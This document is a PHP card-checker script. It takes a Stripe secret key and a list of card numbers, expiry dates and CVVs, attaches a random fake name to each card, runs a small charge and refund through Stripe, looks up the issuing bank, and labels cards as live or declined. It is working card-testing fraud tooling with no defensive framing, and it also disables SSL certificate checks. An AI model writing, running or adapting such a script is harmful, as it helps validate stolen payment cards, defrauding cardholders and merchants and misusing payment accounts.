<?php

// --- FULL DEBUG MODE ---
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);

// --- SET DEFAULT TIMEZONE ---
date_default_timezone_set('UTC'); // safer for Docker

// --- VALIDATE COMMAND-LINE ARGUMENTS ---
if (!isset($argv[1]) || !isset($argv[2])) {
    die("Error: Missing Stripe key or CC list arguments.");
}

// --- RECEIVE DATA ---
$sk = $argv[1];
$lista = $argv[2];

// --- HELPER FUNCTIONS ---
function multiexplode($delimiters, $string) {
    $one = str_replace($delimiters, $delimiters[0], $string);
    return explode($delimiters[0], $one);
}

function GetStr($string, $start, $end) {
    if (strpos($string, $start) === false || strpos($string, $end) === false) {
        return "";
    }
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

// --- PARSE CC DATA ---
$cc_parts = multiexplode(array(":", "|", " "), $lista);
$cc = $cc_parts[0] ?? '';
$mes = $cc_parts[1] ?? '';
$ano = $cc_parts[2] ?? '';
$cvv = $cc_parts[3] ?? '';

// --- RANDOM USER DATA ---
$ch_user = curl_init();
curl_setopt($ch_user, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
curl_setopt($ch_user, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch_user, CURLOPT_USERAGENT, 'Mozilla/5.0');
$get = curl_exec($ch_user);
curl_close($ch_user);

$name = 'John';
$last = 'Doe';

if ($get) {
    preg_match_all('/"first":"(.*?)"/i', $get, $matches1);
    preg_match_all('/"last":"(.*?)"/i', $get, $matches2);
    $name = $matches1[1][0] ?? 'John';
    $last = $matches2[1][0] ?? 'Doe';
}

// --- STRIPE API CALLS ---
$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':');

// CREATE SOURCE
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name.'+'.$last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano);
$result1 = curl_exec($ch);
$s = json_decode($result1, true);
$token = $s['id'] ?? null;

// CREATE CUSTOMER
$token3 = null;
if ($token) {
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'description='.$name.' '.$last.'&source='.$token);
    $result2 = curl_exec($ch);
    $cus = json_decode($result2, true);
    $token3 = $cus['id'] ?? null;
} else {
    $result2 = "{}";
}

// CREATE CHARGE
$chtoken = null;
if ($token3) {
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=50&currency=usd&customer='.$token3);
    $result3 = curl_exec($ch);
    $chtoken = trim(strip_tags(GetStr($result3, '"id": "','"')));
} else {
    $result3 = "{}";
}

// CREATE REFUND
if ($chtoken) {
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/refunds');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'charge='.$chtoken.'&amount=50&reason=requested_by_customer');
    $result4 = curl_exec($ch);
}

// BIN LOOKUP
$cctwo = substr($cc, 0, 6);
$ch_bin = curl_init();
curl_setopt($ch_bin, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo);
curl_setopt($ch_bin, CURLOPT_USERAGENT, 'Mozilla/5.0');
curl_setopt($ch_bin, CURLOPT_RETURNTRANSFER, 1);
$fim = curl_exec($ch_bin);
curl_close($ch_bin);

$fim = json_decode($fim, true);
$bank = $fim['bank']['name'] ?? 'N/A';
$country = $fim['country']['alpha2'] ?? 'N/A';
$type = $fim['type'] ?? 'N/A';

curl_close($ch);

// --- FULL DEBUG OUTPUT ---
echo "<pre>";
echo "=== DEBUG OUTPUT ===\n";
echo "Card: $lista\n";
echo "Stripe Source (Result1): $result1\n";
echo "Stripe Customer (Result2): $result2\n";
echo "Stripe Charge (Result3): $result3\n";
echo "Stripe Refund (Result4): $result4\n";
echo "Bank: $bank | Country: $country | Type: $type\n";
echo "==================\n";
echo "</pre>";

// --- RESPONSE LOGIC ---
if (strpos($result3, '"seller_message": "Payment complete."') !== false) {
    echo "<span class='badge badge-success'>#Approved</span> ◈ <span class='badge badge-success'>$lista</span> ◈ <span class='badge badge-info'> 「Approved (Charge & Refund) ✅」</span> ◈<span class='badge badge-info'> 「 $bank ($country) - $type 」 </span>";
} elseif (strpos($result3, '"cvc_check": "pass"') !== false) {
    echo "<span class='badge badge-success'>#Approved</span> ◈ <span class='badge badge-success'>$lista</span> ◈ <span class='badge badge-info'> 「Approved (CVV Pass) ✔️」</span> ◈<span class='badge badge-info'> 「 $bank ($country) - $type 」 </span>";
} elseif (strpos($result2, '"code": "incorrect_cvc"') !== false || strpos($result1, '"code": "invalid_cvc"') !== false) {
    echo "<span class='badge badge-success'>#Approved</span> ◈ <span class='badge badge-danger'>$lista</span> ◈ <span class='badge badge-warning'> 「CCN Live (Incorrect CVV) 🟡」</span> ◈<span class='badge badge-info'> 「 $bank ($country) - $type 」 </span>";
} elseif (strpos($result3, "insufficient_funds") !== false) {
    echo "<span class='badge badge-success'>#Approved</span> ◈ <span class='badge badge-success'>$lista</span> ◈ <span class='badge badge-warning'> 「CVV Live (Insufficient Funds) 💰」</span> ◈<span class='badge badge-info'> 「 $bank ($country) - $type 」 </span>";
} else {
    echo "<span class='badge badge-danger'>#Declined</span> ◈ <span class='badge badge-danger'>$lista</span> ◈ <span class='badge badge-warning'> 「An Unknown Error Occurred ❓」</span> ◈<span class='badge badge-info'> 「 $bank ($country) - $type 」 </span>";
}
?>
